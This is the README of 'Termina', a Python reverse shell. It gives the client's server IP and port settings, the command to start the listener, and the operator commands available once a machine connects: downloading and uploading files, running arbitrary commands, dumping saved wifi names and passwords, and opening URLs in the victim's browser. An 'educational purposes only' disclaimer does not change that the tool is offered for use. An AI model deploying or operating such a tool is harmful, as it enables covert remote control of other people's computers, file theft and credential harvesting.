# **Termina**
### _A simple remote shell/reverse shell written in python_
# __
  ### ~ Hold your horses Adventurer, You have made this far so
  ### Pease consider this tool is created for educational purposes only.
  ### And not for those script kiddies who doesent know how to code or use metaxploit.
  ### If you doesent know the meaning of the sentence "educational purposes only" you are not welcome.
  ### Please don't harm anyone using this tool. (Script kiddies  use free tools to flex)
  ### If you are not a scriptkiddy or person who doesent know the meaning of "educational purposes only"
  ### You are free to use this tool. ~
# __
# How to use:
 ## Client:
  > ### Edit Line 5 and 6 to your ip or server ip and port
```python
import struct,socket,subprocess,os,platform,webbrowser as browser
# server_config
IP = "localhost" # Your server IP, default: localhost
port = 4444  # #Your server Port, default: 4444
```
 ## Server:
  > ### In command prompt enter cmmand
  ```bash
  python TerminaListner.py <ip address> <port>
  ```
  > ### Wait for the client connection
  > ### When the client is connected you can run any built in terminal commands or special sommands provided by the tool
   #### Eg-
   ```bash
     dir
     ls
     ipconfig
     ifconkig
     :kill
     :download
   ```
     
#Commands:
  > ### :help - ``` Display help command ```
  > ### :download - ``` Download file from client machine ```
   #### usage -
  ```bash
    :download <filename>.<extention>
  ```
  > ### :upload - ``` Upload file to client machine ```
   #### usage -
  ```bash
  :upload <filename>.<extention>
  ```
  > ### :kill - ``` Kill the connection with client machine ```
  > ### :exec - ```Run external command ```
   #### usage-
  ```bash
   :exec <command you wan to run in your mashine>
  ```
  > ### :check - ```Check if client machine is connected to internet```
  > ### :wifi - ```Show Client machine wifi info [names,passwod,etc]```
  > ### :browse - ```Open an website on client machine browser```
   #### usage-
  ```bash
  :browse <url>
  ```
  > ### pwd - ```Print working folder```
